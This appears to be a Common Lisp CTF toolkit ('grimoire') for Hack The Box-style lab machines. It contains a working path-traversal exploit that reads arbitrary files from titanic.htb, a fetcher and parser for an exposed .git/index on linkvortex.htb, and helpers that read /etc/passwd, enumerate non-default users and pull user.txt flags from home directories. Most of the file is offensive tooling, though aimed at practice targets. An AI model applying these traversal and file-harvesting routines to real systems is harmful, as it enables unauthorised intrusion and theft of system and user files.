(in-package #:grimoire)

(defparameter *default-users* (load-data "default-users.txt"))
(defparameter *interesting-files* (load-data "interesting-files.txt"))

(defparameter *capacities* (make-hash-table :test #'equal))

;; Machine functions

(defun titanic/read-file (path)
  (let* ((url (format nil "http://titanic.htb/download?ticket=../../../../~a" path))
         (res (dex:get url)))
    (handler-case (trivial-utf-8:utf-8-bytes-to-string res)
      (error (c) 
        (format t "[+] Error reading file: ~a~%" c)
        res))))

;; Generic functions

(defmacro parse-structure (structure)
  (if (listp structure)
      (let ((fun (car structure))
            (body (cadr structure)))
        (cond ((eq fun :string)
               `(trivial-utf-8:utf-8-bytes-to-string
                 (parse-structure ,body)))
              ((eq fun :bytes)
               `(let ((res (subseq bytes index (+ index ,body))))
                  (setf index (+ index ,body))
                  res))
              ((eq fun :nul-terminated-bytes)
               `(let ((v (make-array 0
                                     :element-type '(unsigned-byte 8)
                                     :adjustable t
                                     :fill-pointer t)))
                  (loop for b = (elt bytes index)
                        if (not (= b 0))
                        do (vector-push-extend b v)
                        do (setf index (1+ index))
                        until (= b 0))
                  v))
              ((eq fun :integer)
               `(reduce 
                 (lambda (acc byte)
                   (logior (ash acc 8) byte))
                 (parse-structure ,body)))
              ((eq fun :hex)
               `(ironclad:byte-array-to-hex-string 
                 (parse-structure ,body)))
              (t structure)))
      structure))

(defmacro let-bytes ((bytes index) grammar &body body)
  `(let ((index ,index)
         (bytes ,bytes))
     (let ,(loop for (name structure) in grammar
                 collect `(,name (parse-structure ,structure)))
       ,@body)))

(defparameter *index* (grm/exposed-git "http://dev.linkvortex.htb/"))

(defun test () 
  (let ((buff *index*)
        (start 0))
    (let-bytes (buff start)
        ((signature (:string (:bytes 4)))
         (version (:integer (:bytes 4)))
         (num-entries (:integer (:bytes 4))))
      (format t "[+] Signature: ~a, version: ~a, entries: ~a~%" 
              signature version num-entries)

      (assert (equal signature "DIRC"))
      
      (let-bytes (buff start)
          ((last-metadata-change (:hex (:bytes 4)))
           (last-metadata-change-nano (:bytes 4))
           (last-data-change (:bytes 4))
           (last-data-change-nano (:bytes 4))
           (device (:hex (:bytes 4)))
           (inode (:hex (:bytes 4)))
           (mode (:hex (:bytes 4)))
           (user-id (:hex (:bytes 4)))
           (group-id (:hex (:bytes 4)))
           (file-size (:integer (:bytes 4)))
           (object-name (:bytes 20)) ;; assuming sha-1 (160 bit)
           (flags (:bytes 2))
           (file-name (:nul-terminated-bytes)))
        (list last-metadata-change)))))

(grm/defun grm/exposed-git () (url)
  (dex:get (str:concat url ".git/index")))

(grm/defun grm/system-info (:read) ()
  "list all the users from /etc/passwd"
  (grm/read-into-string "/etc/os-release"))

(grm/defun grm/all-users (:read) ()
  "list all the users from /etc/passwd"
  (loop for line in (str:lines (grm/read-into-string "/etc/passwd"))
        if (not (alexandria:emptyp line))
        collect (car (str:split ":" line))))

(grm/defun grm/users (:read) ()
  "list the users that are not default"
  (let ((all-users (grm/all-users)))
    (remove-if #'(lambda (u) (member u *default-users* :test #'equal)) 
               all-users)))

(grm/defun grm/user-flag (:read) ()
  (loop for user in (grm/users)
        return (str:trim 
                (grm/read-into-string
                 (format nil "/home/~a/user.txt" user)))))

(grm/defun grm/interesting-files (:read) ()
  nil)